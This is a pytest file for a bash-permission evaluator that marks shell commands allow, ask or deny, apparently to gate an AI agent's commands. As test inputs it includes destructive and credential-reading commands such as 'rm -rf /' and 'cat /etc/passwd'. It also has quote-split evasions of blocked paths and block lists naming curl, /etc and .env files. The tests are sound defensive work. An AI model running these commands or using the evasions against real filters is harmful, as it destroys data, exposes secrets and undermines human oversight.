"""Tests for lovely-devin-permissions bash command evaluation.

Tests the evaluate_bash_command function across different rule types,
aggregation behavior, and edge cases.
"""

from typing import Any, ClassVar

import pytest

from lovely_bash_permissions.config.devin import exec_permission_to_regex
from lovely_bash_permissions.errors import ShfmtError
from lovely_bash_permissions.evaluate import _construct_policy_verdict, evaluate_bash_command
from lovely_bash_permissions.hook import _hook_command
from lovely_bash_permissions.parser import parse as parser_parse
from tests.conftest import make_config


class TestEvaluateAllowedPatterns:
    """Tests for allowed_cmds_regex evaluation."""

    def test_allowed_pattern_matches(self) -> None:
        """Command name only matches -> ask (no args pattern)."""
        result = evaluate_bash_command(
            "ls -la",
            make_config(allowed=["^ls$"]),
        )
        assert result["status"] == "ask"

    def test_allowed_pattern_no_match(self) -> None:
        """Command doesn't match any allowed pattern -> ask."""
        result = evaluate_bash_command(
            "rm -rf /",
            make_config(allowed=["^ls", "^cat"]),
        )
        assert result["status"] == "ask"

    def test_no_allowed_patterns(self) -> None:
        """No allowed_patterns with wildcard allow -> allow."""
        result = evaluate_bash_command("ls", make_config(wildcard="allow"))
        assert result["status"] == "allow"

    def test_multiple_commands_one_allowed(self) -> None:
        """Multiple commands, one matches by name only -> ask."""
        result = evaluate_bash_command(
            "ls && cat file.txt",
            make_config(allowed=["^ls", "^notcat"]),
        )
        assert result["status"] == "ask"

    def test_multiple_commands_none_allowed(self) -> None:
        """Multiple commands, none match -> ask."""
        result = evaluate_bash_command(
            "rm -rf / && echo done",
            make_config(allowed=["^ls", "^cat"]),
        )
        assert result["status"] == "ask"

    def test_allowed_pattern_full_command_line(self) -> None:
        """Allowed pattern should match full command line including args.

        Bug: patterns like ^git\\s+(log|diff|status)(\\s+.*)?$ match "git log"
        but not just the command name "git". The Python implementation was
        matching patterns against cmd_name only, not the full command line.
        """
        # This pattern should match "git log" but not "git"
        result = evaluate_bash_command(
            "git log",
            make_config(allowed=["^git\\s+(log|diff|status)(\\s+.*)?$"]),
        )
        assert result["status"] == "allow"

    def test_allowed_pattern_mismatch_full_command_line(self) -> None:
        """Pattern requiring args should not match bare command name.

        The pattern ^git\\s+log$ requires the full "git log" command,
        so bare "git" should not match.
        """
        result = evaluate_bash_command(
            "git",
            make_config(allowed=["^git\\s+log$"]),
        )
        assert result["status"] == "ask"

    def test_allowed_pattern_unanchored_substring(self) -> None:
        """Unanchored allowed pattern matches anywhere in the command line."""
        result = evaluate_bash_command(
            "echo git",
            make_config(allowed=["git"]),
        )
        assert result["status"] == "allow"
        assert "command matches allowed pattern: git" in result["reason"]

    def test_allowed_pattern_unanchored_absent_still_asks(self) -> None:
        """Unanchored allowed pattern still asks when it matches nowhere."""
        result = evaluate_bash_command(
            "echo hi",
            make_config(allowed=["git"]),
        )
        assert result["status"] == "ask"

    def test_declclause_export_segment_extracted(self) -> None:
        """DeclClause export is evaluated as the export command.

        The operand is reported as its own variable-assignment segment, so it
        needs a policy of its own; ``variable_assignment=allow`` keeps the test
        about the keyword segment matching the pattern.
        """
        result = evaluate_bash_command(
            "export BOGUS=true bogus",
            make_config(allowed=[r"^export(\s+.*)?$"], variable_assignment="allow"),
        )
        assert result["status"] == "allow"
        assert [segment["command"] for segment in result["segments"]] == ["", "export"]
        assert r"command matches allowed pattern: ^export(\s+.*)?$" in result["reason"]

    def test_for_clause_extracted(self) -> None:
        """For loop body commands should be extracted."""
        result = evaluate_bash_command("for i in 1 2; do echo; done", make_config(allowed=["^echo$"]))
        assert result["status"] == "allow"  # 'echo' matches pattern

    def test_subshell_extracted(self) -> None:
        """Commands inside parentheses (...) are extracted."""
        result = evaluate_bash_command(
            "( ls )",
            make_config(allowed=["^ls$"], subshell="allow"),
        )
        assert result["status"] == "allow"  # 'ls' inside parens matches pattern

    def test_cstyle_loop_extracted(self) -> None:
        """C-style for loop body commands are extracted."""
        result = evaluate_bash_command(
            "for ((i=0;i<10;i++)); do echo x; done",
            make_config(allowed=["^echo\\s+x$"]),
        )
        assert result["status"] == "allow"  # 'echo x' matches pattern

    def test_cstyle_prelude_cmdsubst_not_bypassed(self) -> None:
        """C-style prelude substitutions in for ((...)) must not be dropped.

        The rm runs in the loop init, so every typed-AST pass (command_substitution
        policy, blocked-path scan, segment extraction) has to reach it.  The
        foreach form for i in $(rm ...) is denied the same way.
        """
        result = evaluate_bash_command(
            "for ((i=$(rm -rf /etc/passwd); i<1; i++)); do :; done",
            {"*": "allow", "command_substitution": "deny", "blocked_cmds_regex": [r"/etc"]},
        )
        assert result["status"] == "deny"

    def test_cstyle_prelude_cmdsubst_visible_to_substitution_pass(self) -> None:
        """_subst_flags sees the C-style prelude via the typed AST."""
        from lovely_bash_permissions.converter import node_from_json
        from lovely_bash_permissions.evaluate import _subst_flags
        from lovely_bash_permissions.parser import parse

        tree = node_from_json(parse("for ((i=$(date); i<1; i++)); do :; done", "bash"))
        assert tree is not None
        assert _subst_flags(tree)["command_substitution"] is True


class TestEvaluateBlockedPatterns:
    """Tests for blocked_cmds_regex evaluation."""

    def test_blocked_pattern_matches(self) -> None:
        """Argument matches blocked pattern -> deny."""
        result = evaluate_bash_command(
            "ls /etc/passwd",
            make_config(blocked=["/etc/passwd"]),
        )
        assert result["status"] == "deny"

    def test_blocked_pattern_no_match(self) -> None:
        """No blocked match but no allow-list -> wildcard ask governs."""
        result = evaluate_bash_command(
            "ls /var/log",
            make_config(blocked=["/etc/passwd"]),
        )
        assert result["status"] == "ask"

    def test_no_blocked_patterns(self) -> None:
        """No blocked_patterns with wildcard allow -> allow."""
        result = evaluate_bash_command("ls /etc/passwd", make_config(wildcard="allow"))
        assert result["status"] == "allow"

    def test_blocked_command_name_matches(self) -> None:
        """Command name matches blocked pattern -> deny."""
        result = evaluate_bash_command(
            "curl example.com",
            make_config(blocked=["^curl"]),
        )
        assert result["status"] == "deny"

    def test_multiple_commands_one_blocked(self) -> None:
        """Multiple commands, one blocked -> deny."""
        result = evaluate_bash_command(
            "ls && cat /etc/passwd",
            make_config(blocked=["/etc/passwd"]),
        )
        assert result["status"] == "deny"

    def test_multiple_commands_none_blocked(self) -> None:
        """Multiple commands, none blocked, no allow-list -> wildcard ask governs."""
        result = evaluate_bash_command(
            "ls && cat file.txt",
            make_config(blocked=["/etc/passwd"]),
        )
        assert result["status"] == "ask"


class TestEvaluateBlockedJoinedLineSemantics:
    """Blocked patterns use the same joined-line logic as allowed patterns.

    Anchoring is honored literally against the ``"name arg1 arg2"`` segment
    line: ``\\.env$`` does not fire mid-line (use ``\\.env`` instead).
    """

    def test_end_anchor_mid_line_not_denied(self) -> None:
        """`echo foo.env bar` with `\\.env$` is not denied."""
        result = evaluate_bash_command(
            "echo foo.env bar",
            {"*": "allow", "blocked_cmds_regex": [r"\.env$"]},
        )
        assert result["status"] == "allow"

    def test_unanchored_mid_line_denied(self) -> None:
        """`echo foo.env bar` with `\\.env` is denied."""
        result = evaluate_bash_command(
            "echo foo.env bar",
            {"*": "allow", "blocked_cmds_regex": [r"\.env"]},
        )
        assert result["status"] == "deny"
        assert "matches blocked pattern" in result["reason"]

    def test_unanchored_substring_denied(self) -> None:
        """Unanchored patterns still fire anywhere on the joined line."""
        result = evaluate_bash_command(
            "echo /etc/passwd extra",
            {"*": "allow", "blocked_cmds_regex": [r"\/etc"]},
        )
        assert result["status"] == "deny"

    def test_start_anchor_only_at_line_start(self) -> None:
        """`^echo` denies `echo hi` but not `cat echo` (anchor is literal)."""
        assert evaluate_bash_command("echo hi", {"*": "allow", "blocked_cmds_regex": ["^echo"]})["status"] == "deny"
        assert evaluate_bash_command("cat echo", {"*": "allow", "blocked_cmds_regex": ["^echo"]})["status"] == "allow"

    def test_heredoc_mid_body_end_anchor_not_denied(self) -> None:
        """End-anchored pattern does not match a secret mid-body."""
        result = evaluate_bash_command(
            "wc -l <<EOF\nline1\nfoo.env\nline3\nEOF",
            {
                "*": "ask",
                "allowed_cmds_regex": [r"^wc(\s+.*)?$"],
                "blocked_cmds_regex": [r"\.env$"],
                "input_redirection": "allow",
            },
        )
        assert result["status"] == "allow"

    def test_heredoc_mid_body_unanchored_denied(self) -> None:
        """Unanchored pattern matches a secret mid-body."""
        result = evaluate_bash_command(
            "wc -l <<EOF\nline1\nfoo.env\nline3\nEOF",
            {
                "*": "ask",
                "allowed_cmds_regex": [r"^wc(\s+.*)?$"],
                "blocked_cmds_regex": [r"\.env"],
                "input_redirection": "allow",
            },
        )
        assert result["status"] == "deny"

    def test_normalized_form_quote_split_denied(self) -> None:
        """Quote-split `/e"tc"/passwd` is denied via the executed form."""
        result = evaluate_bash_command(
            'cat /e"tc"/passwd',
            {"*": "allow", "blocked_cmds_regex": [r"\/etc"]},
        )
        assert result["status"] == "deny"

    def test_quote_split_reason_reports_normalized_line(self) -> None:
        """The deny reason carries the normalized joined line, not the raw split spelling."""
        result = evaluate_bash_command(
            'cat /e"tc"/passwd',
            {"*": "allow", "blocked_cmds_regex": [r"\/etc"]},
        )
        assert result["status"] == "deny"
        assert '"cat /etc/passwd"' in result["reason"]

    def test_raw_only_reason_reports_raw_line(self) -> None:
        """A pattern matching only the raw form denies with the raw joined line."""
        result = evaluate_bash_command(
            'cat /e"tc"/passwd',
            {"*": "allow", "blocked_cmds_regex": [r'/e"tc"']},
        )
        assert result["status"] == "deny"
        assert '"cat /e"tc"/passwd"' in result["reason"]

    def test_old_key_ignored(self) -> None:
        """A stale `blocked_paths_regex` key alone does not block."""
        result = evaluate_bash_command(
            "cat /etc/passwd",
            {"*": "allow", "blocked_paths_regex": [r"/etc"]},
        )
        assert result["status"] == "allow"


class TestEvaluateWholeCommandBlockedScan:
    """`blocked_cmds_regex` is matched against the WHOLE raw command string.

    The per-segment checks only see a segment's *executed* command line, so
    text that never becomes an argument - an expansion default, an array
    assignment, a `[[ -f ... ]]` test operand, a comment, a quoted mention -
    was invisible to them. The whole-command scan matches the command as
    written, which is what "block on mention" has always meant.

    Consequences pinned here: comments and quoted text are IN scope, and
    anchoring is honored literally against the whole command, so `\\.env$`
    only fires when the command actually ends in `.env`.
    """

    BLOCK_ETC: ClassVar[dict[str, str | list[str]]] = {"*": "allow", "blocked_cmds_regex": [r"/etc"]}

    def test_param_expansion_default_denied(self) -> None:
        """`${BAR:-/etc/passwd}` never reaches the argument list but still denies."""
        result = evaluate_bash_command("echo ${BAR:-/etc/passwd}", {"*": "ask", "blocked_cmds_regex": [r"/etc"]})
        assert result["status"] == "deny"

    @pytest.mark.parametrize("wildcard", ["ask", "allow"])
    def test_array_assignment_denied(self, wildcard: str) -> None:
        """`A=(/etc/passwd)` denies under both the ask and allow wildcards."""
        result = evaluate_bash_command("A=(/etc/passwd)", {"*": wildcard, "blocked_cmds_regex": [r"/etc"]})
        assert result["status"] == "deny"

    @pytest.mark.parametrize("wildcard", ["ask", "allow"])
    def test_test_expression_denied(self, wildcard: str) -> None:
        """`[[ -f /etc/passwd ]]` produces no exec segment but still denies."""
        result = evaluate_bash_command("[[ -f /etc/passwd ]]", {"*": wildcard, "blocked_cmds_regex": [r"/etc"]})
        assert result["status"] == "deny"

    def test_reason_reports_whole_command(self) -> None:
        """The deny reason quotes the whole raw command, not a segment line."""
        result = evaluate_bash_command("A=(/etc/passwd)", self.BLOCK_ETC)
        assert result["status"] == "deny"
        assert '"A=(/etc/passwd)"' in result["reason"]

    def test_return_shape_preserved(self) -> None:
        """A whole-command deny does not early-return: `segments` is still present."""
        result = evaluate_bash_command("[[ -f /etc/passwd ]]", self.BLOCK_ETC)
        assert "segments" in result
        assert result["segments"] == []

    def test_comment_mention_denied(self) -> None:
        """A blocked path inside a comment is in scope and denies."""
        result = evaluate_bash_command("echo hi # /etc/passwd", self.BLOCK_ETC)
        assert result["status"] == "deny"

    def test_quoted_mention_denied(self) -> None:
        """A blocked path inside a quoted string is in scope and denies."""
        result = evaluate_bash_command('echo "see /etc/passwd docs"', self.BLOCK_ETC)
        assert result["status"] == "deny"

    def test_quote_split_still_denied_via_segment(self) -> None:
        """The per-segment executed form still carries the quote-split path."""
        result = evaluate_bash_command('cat /e"tc"/passwd', {"*": "allow", "blocked_cmds_regex": [r"\/etc"]})
        assert result["status"] == "deny"
        assert '"cat /etc/passwd"' in result["reason"]

    # Anchoring contract: `\.env$` is literal against the WHOLE command, so a
    # trailing `}` or `; do :; done` defeats it. Pinning this is the point:
    # it is the difference between "ends in .env" and "mentions .env".
    ENV_CFG: ClassVar[dict[str, str | list[str]]] = {
        "*": "allow",
        "blocked_cmds_regex": [r"\.env$"],
        "allowed_cmds_regex": [r"^echo(\s+.*)?$"],
    }

    def test_anchor_not_matched_by_trailing_brace(self) -> None:
        """`echo ${BAR:-foo.env}` ends in `}`, not `.env` → not denied."""
        assert evaluate_bash_command("echo ${BAR:-foo.env}", self.ENV_CFG)["status"] == "allow"

    def test_anchor_matched_when_command_ends_in_env(self) -> None:
        """`echo foo.env` genuinely ends in `.env` → denied."""
        assert evaluate_bash_command("echo foo.env", self.ENV_CFG)["status"] == "deny"

    def test_anchor_not_matched_mid_compound_command(self) -> None:
        """`for f in foo.env; ...` mentions `.env` but does not end in it."""
        result = evaluate_bash_command(
            "for f in foo.env; do :; done", {"*": "allow", "blocked_cmds_regex": [r"\.env$"]}
        )
        assert result["status"] == "allow"

    def test_hook_label_is_scanned_like_any_other_text(self) -> None:
        """The whole-command scan includes the label.

        The `: '[♡ perms: ...]'` wrapper is an ordinary command, so a deny reason
        quoting a path can deny the command it describes, and a blocked pattern
        matching the label's literal text
        denies - which is the documented sharp edge, and why the README tells
        users not to write patterns like ``perms``.
        """
        config = {"*": "allow", "allowed_cmds_regex": [r"^echo(\s+.*)?$"], "blocked_cmds_regex": ["perms"]}
        rewritten = _hook_command("allow", "command matches allowed pattern: ^echo(\\s+.*)?$", "echo hi")
        assert "perms" in rewritten
        assert evaluate_bash_command(rewritten, config)["status"] == "deny"

    def test_hook_label_does_not_deny_a_realistic_blocked_pattern(self) -> None:
        """A denied command's label still describes, and re-denies, its payload.

        Re-evaluating a wrapped
        command whose payload trips a blocked pattern denies.
        """
        config = {"*": "allow", "allowed_cmds_regex": [r"^echo(\s+.*)?$"], "blocked_cmds_regex": [r"\/etc"]}
        rewritten = _hook_command("block", "Argument cat /etc/passwd matches blocked pattern \\/etc", "cat /etc/passwd")
        assert evaluate_bash_command(rewritten, config)["status"] == "deny"

    def test_hook_label_payload_blocked_still_denied(self) -> None:
        """Stripping the label never waives a blocked payload behind the `;`."""
        rewritten = _hook_command("allow", "command matches allowed pattern: ^echo", "cat /etc/passwd")
        result = evaluate_bash_command(rewritten, {"*": "allow", "blocked_cmds_regex": [r"/etc"]})
        assert result["status"] == "deny"


class TestEvaluateWildcardIsBaseline:
    """The wildcard is the per-command baseline; specific policies add constraints only.

    A command is auto-approved only by an allowed-pattern match or an explicit
    ``"*": "allow"``. No policy (subshell, variable_assignment, redirection,
    blocked-only configs) grants a blanket allow for commands that are neither
    allow-listed nor wildcard-allowed - the broader fail-open class.
    """

    def test_blocked_only_config_denies_param_expansion_pattern(self) -> None:
        """`${x%@/etc/*}` mentions a blocked pattern in the raw string → deny.

        The whole-command blocked scan covers text a segment's executed
        arguments never show (here `${x%@/etc/*}` collapses to `$x`), so the
        verdict is "deny" rather than "ask".
        """
        result = evaluate_bash_command(
            "echo ${x%@/etc/*}",
            {"*": "ask", "blocked_cmds_regex": [r"/etc"]},
        )
        assert result["status"] == "deny"
        assert "matches blocked pattern /etc" in result["reason"]

    def test_blocked_only_config_asks_plain_command(self) -> None:
        """Blocked-only config under ask wildcard asks."""
        result = evaluate_bash_command(
            "echo hi",
            {"*": "ask", "blocked_cmds_regex": [r"/etc"]},
        )
        assert result["status"] == "ask"
        assert "not allowlisted" in result["reason"]
        assert "allowed by wildcard policy" not in result["reason"]

    def test_blocked_only_config_asks_curl(self) -> None:
        """A non-blocked command still asks under blocked-only + ask."""
        result = evaluate_bash_command(
            "curl example.com",
            {"*": "ask", "blocked_cmds_regex": [r"/etc"]},
        )
        assert result["status"] == "ask"

    def test_blocked_only_config_still_denies(self) -> None:
        """Blocked paths still deny under the reduced config."""
        result = evaluate_bash_command(
            "cat /etc/passwd",
            {"*": "ask", "blocked_cmds_regex": [r"/etc"]},
        )
        assert result["status"] == "deny"

    def test_deny_list_via_explicit_wildcard_allow(self) -> None:
        """Explicit "*": "allow" still provides deny-list semantics."""
        config = {"*": "allow", "blocked_cmds_regex": [r"/etc"]}
        assert evaluate_bash_command("echo hi", config)["status"] == "allow"
        assert evaluate_bash_command("cat /etc/passwd", config)["status"] == "deny"

    def test_subshell_allow_does_not_approve_outer_command(self) -> None:
        """`echo $(date)` + command_substitution=allow + ask wildcard asks for `echo`."""
        result = evaluate_bash_command(
            "echo $(date)",
            {"*": "ask", "command_substitution": "allow"},
        )
        assert result["status"] == "ask"

    def test_subshell_allow_with_all_listed_commands(self) -> None:
        """Subshell=allow approves when outer and inner commands are allow-listed."""
        result = evaluate_bash_command(
            "echo $(date)",
            {"*": "ask", "command_substitution": "allow", "allowed_cmds_regex": [r"^echo(\s+.*)?$", r"^date$"]},
        )
        assert result["status"] == "allow"

    def test_variable_assignment_allow_does_not_approve_command(self) -> None:
        """`FOO=bar curl x` + va=allow + ask wildcard asks for `curl`."""
        result = evaluate_bash_command(
            "FOO=bar curl x",
            {"*": "ask", "variable_assignment": "allow"},
        )
        assert result["status"] == "ask"
        assert '"curl" command is not allowlisted' in result["reason"]

    def test_variable_assignment_allow_standalone_truthful_reason(self) -> None:
        """Standalone `FOO=bar` with va=allow allows with a truthful reason."""
        result = evaluate_bash_command(
            "FOO=bar",
            {"*": "ask", "variable_assignment": "allow"},
        )
        assert result["status"] == "allow"
        assert "variable assignment allowed" in result["reason"]
        assert "wildcard policy" not in result["reason"]

    def test_wildcard_allow_no_patterns_truthful_reason(self) -> None:
        """Explicit wildcard allow keeps the truthful fallback reason."""
        result = evaluate_bash_command("ls", {"*": "allow"})
        assert result["status"] == "allow"
        assert result["reason"] == "allowed by wildcard policy (allow)"

    def test_empty_segment_wildcard_ask(self) -> None:
        """No-segment commands under "*": "ask" fall back to the wildcard (ask)."""
        result = evaluate_bash_command(
            "[[ -f x ]]",
            {"*": "ask"},
        )
        assert result["status"] == "ask"
        assert "wildcard policy (ask)" in result["reason"]

    def test_cmdsubst_in_test_clause_resolves_to_real_segment(self) -> None:
        """Test-operand command substitution yields a real cat segment.

        Verdict is unchanged (ask under "*": "ask"), but the reason names the
        real command instead of falling through the empty-segment path.
        """
        result = evaluate_bash_command(
            "[[ $(cat /etc/passwd) == x ]]",
            {"*": "ask"},
        )
        assert result["status"] == "ask"
        assert '"cat" command is not allowlisted' in result["reason"]

    def test_empty_segment_blocked_subshell_denied(self) -> None:
        """The blocked-path scan denies before the empty-segment return.

        The deny comes from the real `cat` segment's blocked-path check rather
        than the empty-segment subshell scan - verdict and reason are
        unchanged.
        """
        result = evaluate_bash_command(
            "[[ $(cat /etc/passwd) == x ]]",
            {"*": "ask", "blocked_cmds_regex": [r"/etc"]},
        )
        assert result["status"] == "deny"


class TestEvaluateBlockedReasonDedup:
    """Blocked reason messages must not repeat identically.

    The same blocked hit was reported once per pass: the segment loop and the
    subshell-contents pass each appended the identical message, so the final
    reason repeated it once per nesting level. Since blocked matching reports
    the joined segment line (e.g. ``"cat /etc/passwd"``) while the
    substitution-contents pass reports the bare extracted text (e.g.
    ``"/etc/passwd"``), the two passes now contribute distinct messages.
    These tests assert no message repeats exactly.
    """

    BLOCKED: ClassVar[list[str]] = [r"\/etc"]
    MESSAGE = "Blocked by bash permissions"

    def test_blocked_reason_dedup_subshell(self) -> None:
        """`echo $(cat /etc/passwd)` reports each blocked hit once (no exact repeats)."""
        result = evaluate_bash_command(
            "echo $(cat /etc/passwd)",
            make_config(blocked=self.BLOCKED),
        )
        assert result["status"] == "deny"
        parts = result["reason"].split("; ")
        assert len(parts) == len(set(parts))
        assert r"\/etc" in result["reason"]

    def test_blocked_reason_dedup_variable_assignment(self) -> None:
        """`export FOO=$(cat /etc/passwd)` reports each blocked hit once (no exact repeats)."""
        result = evaluate_bash_command(
            "export FOO=$(cat /etc/passwd)",
            make_config(blocked=self.BLOCKED),
        )
        assert result["status"] == "deny"
        parts = result["reason"].split("; ")
        assert len(parts) == len(set(parts))

    def test_blocked_reason_dedup_deeply_nested(self) -> None:
        """Deeply nested subshells do not multiply identical blocked reasons."""
        result = evaluate_bash_command(
            "echo $(echo $(echo $(cat /etc/passwd)))",
            make_config(blocked=self.BLOCKED),
        )
        assert result["status"] == "deny"
        parts = result["reason"].split("; ")
        assert len(parts) == len(set(parts))

    def test_blocked_reason_dedup_same_path_multiple_flags(self) -> None:
        """Distinct blocked paths are each reported without exact repeats."""
        result = evaluate_bash_command(
            "echo $(cat /etc/passwd) $(cat /etc/shadow)",
            make_config(blocked=[r"\/etc/passwd", r"\/etc/shadow"]),
        )
        assert result["status"] == "deny"
        parts = result["reason"].split("; ")
        assert len(parts) == len(set(parts))
        assert r"\/etc/passwd" in result["reason"]
        assert r"\/etc/shadow" in result["reason"]


class TestEvaluateAggregation:
    """Tests for combined allow/deny/ask aggregation."""

    def test_all_allowed(self) -> None:
        """All segments allowed by full command match -> allow."""
        result = evaluate_bash_command(
            "ls -la && cat file.txt",
            make_config(allowed=["^ls\\s+-la", "^cat\\s+file.txt"]),
        )
        assert result["status"] == "allow"

    def test_all_denied(self) -> None:
        """All segments denied -> deny."""
        result = evaluate_bash_command(
            "curl /etc/passwd",
            make_config(blocked=["^curl$", "/etc/passwd"]),
        )
        assert result["status"] == "deny"

    def test_mixed_allowed_and_denied(self) -> None:
        """Some allowed, some denied -> deny."""
        result = evaluate_bash_command(
            "ls && cat /etc/passwd",
            make_config(allowed=["^ls$", "^cat$"], blocked=["/etc/passwd"]),
        )
        assert result["status"] == "deny"

    def test_mixed_allowed_and_asking(self) -> None:
        """Some allowed, some asking -> ask."""
        result = evaluate_bash_command(
            "ls && rm -rf /",
            make_config(allowed=["^ls"]),
        )
        assert result["status"] == "ask"

    def test_all_asking(self) -> None:
        """All segments asking -> ask."""
        result = evaluate_bash_command(
            "rm -rf /",
            make_config(allowed=[]),
        )
        assert result["status"] == "ask"

    def test_deny_overrides_asking(self) -> None:
        """Deny overrides ask in aggregation."""
        result = evaluate_bash_command(
            "ls /etc/passwd && rm -rf /",
            make_config(allowed=["^ls$"], blocked=["/etc/passwd"]),
        )
        assert result["status"] == "deny"

    def test_allowed_overrides_asking(self) -> None:
        """Allowed overrides ask in aggregation (full command match)."""
        result = evaluate_bash_command(
            "ls && rm -rf /",
            make_config(allowed=["^ls", "^rm\\s+-rf\\s+/"]),
        )
        assert result["status"] == "allow"

    def test_multiple_ask_reasons_all_reported(self) -> None:
        """All ask-level rule reasons are reported, not just the first."""
        result = evaluate_bash_command(
            "ls > /tmp/out &",
            make_config(allowed=["^ls"], output="ask", background="ask"),
        )
        assert result["status"] == "ask"
        assert "output redirection requires approval" in result["reason"]
        assert "background execution requires approval: ls" in result["reason"]

    def test_multiple_ask_reasons_three_ways(self) -> None:
        """Ask reasons for output, input, and background redirection all appear."""
        result = evaluate_bash_command(
            "cat < /tmp/in > /tmp/out &",
            make_config(allowed=["^cat"], output="ask", input_redir="ask", background="ask"),
        )
        assert result["status"] == "ask"
        assert "output redirection requires approval" in result["reason"]
        assert "input redirection requires approval" in result["reason"]
        assert "background execution requires approval: cat" in result["reason"]

    def test_allow_shows_pattern_and_redirection_reasons(self) -> None:
        """Auto-approve includes both pattern-match and redirection-allowed reasons."""
        result = evaluate_bash_command(
            "ls > /tmp/out",
            {"*": "allow", "allowed_cmds_regex": ["^ls"], "output_redirection": "allow"},
        )
        assert result["status"] == "allow"
        assert "command matches allowed pattern" in result["reason"]
        assert "output redirection allowed to /tmp/out" in result["reason"]

    def test_allow_shows_pattern_and_background_reasons(self) -> None:
        """Auto-approve includes both pattern-match and background-allowed reasons."""
        result = evaluate_bash_command(
            "ls &",
            {"*": "allow", "allowed_cmds_regex": ["^ls"], "background_execution": "allow"},
        )
        assert result["status"] == "allow"
        assert "command matches allowed pattern" in result["reason"]
        assert "background execution allowed: ls" in result["reason"]

    def test_allow_omits_sentinel_when_no_redirection(self) -> None:
        """No 'no output redirection' clutter when there is nothing to check."""
        result = evaluate_bash_command(
            "ls",
            {"*": "allow", "allowed_cmds_regex": ["^ls"], "output_redirection": "allow"},
        )
        assert result["status"] == "allow"
        assert "command matches allowed pattern" in result["reason"]
        assert "no output redirection" not in result["reason"]

    def test_allow_shows_all_four_reasons(self) -> None:
        """All applicable allow reasons appear alongside the pattern-match reason."""
        result = evaluate_bash_command(
            "cat < /tmp/in > /tmp/out &",
            {
                "*": "allow",
                "allowed_cmds_regex": ["^cat"],
                "output_redirection": "allow",
                "input_redirection": "allow",
                "background_execution": "allow",
            },
        )
        assert result["status"] == "allow"
        for fragment in (
            "command matches allowed pattern",
            "output redirection allowed to /tmp/out",
            "input redirection allowed from /tmp/in",
            "background execution allowed: cat",
        ):
            assert fragment in result["reason"]


class TestEvaluateWildcardPolicy:
    """Tests for wildcard ('*') policy."""

    def test_wildcard_ask(self) -> None:
        """Wildcard ask with no other rules -> ask."""
        result = evaluate_bash_command("ls", make_config(wildcard="ask"))
        assert result["status"] == "ask"

    def test_wildcard_deny(self) -> None:
        """Wildcard deny -> deny."""
        result = evaluate_bash_command("ls", make_config(wildcard="deny"))
        assert result["status"] == "deny"

    def test_wildcard_allow(self) -> None:
        """Wildcard allow -> allow."""
        result = evaluate_bash_command("ls", make_config(wildcard="allow"))
        assert result["status"] == "allow"

    def test_wildcard_with_explicit_allow(self) -> None:
        """Wildcard ask but command explicitly allowed -> allow."""
        result = evaluate_bash_command("ls", make_config(allowed=["^ls"], wildcard="ask"))
        assert result["status"] == "allow"

    def test_wildcard_with_explicit_deny(self) -> None:
        """Wildcard allow but command explicitly denied -> deny."""
        result = evaluate_bash_command(
            "ls /etc/passwd",
            make_config(wildcard="allow", blocked=["/etc/passwd"]),
        )
        assert result["status"] == "deny"


class TestEvaluateInheritance:
    """Options inherit their immediate wildcard parent, falling back to '*' (default ask)."""

    def test_subshell_inherits_wildcard_deny(self) -> None:
        """Deny '*' denies a command substitution."""
        result = evaluate_bash_command("echo $(cat x)", make_config(wildcard="deny"))
        assert result["status"] == "deny"

    def test_subshell_inherits_wildcard_allow(self) -> None:
        """Allow '*' lets a command substitution run."""
        result = evaluate_bash_command("echo $(cat x)", make_config(wildcard="allow"))
        assert result["status"] == "allow"

    def test_variable_assignment_inherits_wildcard_deny(self) -> None:
        """Deny '*' denies a standalone variable assignment."""
        result = evaluate_bash_command("FOO=bar", make_config(wildcard="deny"))
        assert result["status"] == "deny"

    def test_variable_assignment_inherits_wildcard_allow(self) -> None:
        """Allow '*' allows a standalone variable assignment."""
        result = evaluate_bash_command("FOO=bar", make_config(wildcard="allow"))
        assert result["status"] == "allow"

    def test_output_redirection_inherits_wildcard_deny(self) -> None:
        """Deny '*' denies output redirection."""
        result = evaluate_bash_command("echo hi > /tmp/out", make_config(wildcard="deny"))
        assert result["status"] == "deny"

    def test_input_redirection_inherits_wildcard_deny(self) -> None:
        """Deny '*' denies input redirection."""
        result = evaluate_bash_command("cat < /tmp/in", make_config(wildcard="deny"))
        assert result["status"] == "deny"

    def test_background_execution_inherits_wildcard_deny(self) -> None:
        """Deny '*' denies background execution."""
        result = evaluate_bash_command("sleep 1 &", make_config(wildcard="deny"))
        assert result["status"] == "deny"

    def test_output_redirection_kind_inherits_wildcard(self) -> None:
        """A kind omitted from output_redirection inherits the wildcard."""
        result = evaluate_bash_command(
            "echo hi > /dev/null",
            {"*": "deny", "output_redirection": {"stderr_to_dev_null": "ask"}},
        )
        assert result["status"] == "deny"

    def test_explicit_option_overrides_wildcard(self) -> None:
        """An explicit option beats an inherited allow."""
        result = evaluate_bash_command(
            "echo $(cat x)",
            make_config(wildcard="allow", command_substitution="deny"),
        )
        assert result["status"] == "deny"


class TestEvaluateSubshellHandling:
    """Tests for subshell/command substitution handling."""

    def test_subshell_detected(self) -> None:
        """Subshell should be detected and require approval."""
        result = evaluate_bash_command(
            "cat $(ls)",
            make_config(allowed=["^cat", "^ls"]),
        )
        assert result["status"] == "ask"

    def test_nested_subshell(self) -> None:
        """Nested command substitution requires approval."""
        result = evaluate_bash_command(
            "echo $(cat $(ls))",
            make_config(allowed=["^echo", "^cat", "^ls"]),
        )
        assert result["status"] == "ask"

    def test_cmdsubst_without_allowed(self) -> None:
        """Command substitution without allowed patterns requires approval."""
        result = evaluate_bash_command(
            "cat $(ls)",
            make_config(),
        )
        assert result["status"] == "ask"

    def test_subshell_reason(self) -> None:
        """Subshell reason matches TS format when commands are otherwise approved."""
        result = evaluate_bash_command(
            "cat $(ls)",
            make_config(allowed=[r"^cat(\s+.*)?$", r"^ls(\s+.*)?$"]),
        )
        assert result["reason"] == "command substitution requires approval"

    def test_subshell_blocked_path(self) -> None:
        """Dangerous commands inside $(...) command substitutions are blocked."""
        result = evaluate_bash_command(
            "echo $(cat /etc/passwd)",
            make_config(blocked=["^/etc/passwd$"]),
        )
        assert result["status"] == "deny"

    def test_subshell_no_block(self) -> None:
        """Subshell with no blocked paths asks."""
        result = evaluate_bash_command(
            "echo $(cat /etc/passwd)",
            make_config(),
        )
        assert result["status"] == "ask"

    def test_subshell_nested_in_quotes_blocked(self) -> None:
        """Blocked paths inside substitutions within quotes must be caught.

        CmdSubst nodes nested inside DblQuoted/SglQuoted parts are checked by
        the raw-JSON visitor too, so blocked paths hidden inside quoted
        substitutions cannot slip through.
        """
        result = evaluate_bash_command(
            'echo "$(cat /etc/passwd)"',
            make_config(blocked=["^/etc/passwd$"]),
        )
        assert result["status"] == "deny"

